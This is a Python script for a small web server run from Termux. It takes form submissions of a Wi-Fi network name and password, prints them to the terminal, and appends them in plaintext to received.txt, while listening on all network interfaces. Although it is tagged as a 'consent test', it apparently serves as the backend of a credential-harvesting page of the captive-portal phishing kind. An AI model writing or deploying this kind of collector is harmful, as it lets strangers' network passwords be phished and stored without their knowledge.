#!/usr/bin/env python3
# server.py - simple local server (no external deps)
import http.server, socketserver, urllib.parse, os
from datetime import datetime

PORT = 8080
WEB_DIR = os.path.dirname(os.path.abspath(__file__))

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        path = self.path.split('?',1)[0]
        if path == '/' or path == '/index.html':
            self.serve_file('index.html', 'text/html; charset=utf-8')
        else:
            # try static files
            clean = os.path.normpath(path).lstrip(os.sep)
            full = os.path.join(WEB_DIR, clean)
            if os.path.isfile(full):
                ctype = 'application/octet-stream'
                if full.endswith('.css'): ctype='text/css'
                elif full.endswith('.js'): ctype='application/javascript'
                elif full.endswith('.png'): ctype='image/png'
                elif full.endswith('.jpg') or full.endswith('.jpeg'): ctype='image/jpeg'
                self.serve_file(clean, ctype)
            else:
                self.send_error(404, "File Not Found")

    def serve_file(self, filename, ctype):
        try:
            with open(os.path.join(WEB_DIR, filename), 'rb') as f:
                content = f.read()
            self.send_response(200)
            self.send_header('Content-Type', ctype)
            self.send_header('Content-Length', str(len(content)))
            self.end_headers()
            self.wfile.write(content)
        except Exception as e:
            self.send_error(500, "Server error: " + str(e))

    def do_POST(self):
        if self.path != '/submit':
            self.send_error(404, 'Not Found')
            return
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode('utf-8')
        data = urllib.parse.parse_qs(body)
        ssid = data.get('ssid', [''])[0]
        pwd = data.get('password', [''])[0]
        note = data.get('note', [''])[0]

        ts = datetime.now().isoformat()
        logline = f"{ts} SSID:{ssid} PASSWORD:{pwd} NOTE:{note}\n"

        # print to Termux terminal
        print("[CONSENT TEST]", logline.strip())

        # append to received.txt
        try:
            with open(os.path.join(WEB_DIR, 'received.txt'), 'a', encoding='utf-8') as f:
                f.write(logline)
        except Exception as e:
            print("Write error:", e)

        # respond with a small HTML summary (displayed in browser)
        resp = f"""<!doctype html><html><head><meta charset="utf-8"><title>Received</title></head>
        <body style="font-family:system-ui,Arial;padding:18px;">
        <h3>Received (Local Test)</h3>
        <p><strong>SSID:</strong> {urllib.parse.quote(ssid)}</p>
        <p><strong>Password:</strong> {urllib.parse.quote(pwd)}</p>
        <p><strong>Note:</strong> {urllib.parse.quote(note)}</p>
        <p>Check your Termux terminal or <code>received.txt</code>.</p>
        <p><a href="/">Back</a></p>
        </body></html>"""
        resp_bytes = resp.encode('utf-8')
        self.send_response(200)
        self.send_header('Content-Type','text/html; charset=utf-8')
        self.send_header('Content-Length', str(len(resp_bytes)))
        self.end_headers()
        self.wfile.write(resp_bytes)

if __name__ == '__main__':
    os.chdir(WEB_DIR)
    with socketserver.TCPServer(("0.0.0.0", PORT), Handler) as httpd:
        print(f"Serving at http://0.0.0.0:{PORT}/  (Ctrl+C to stop)")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("Server stopped.")
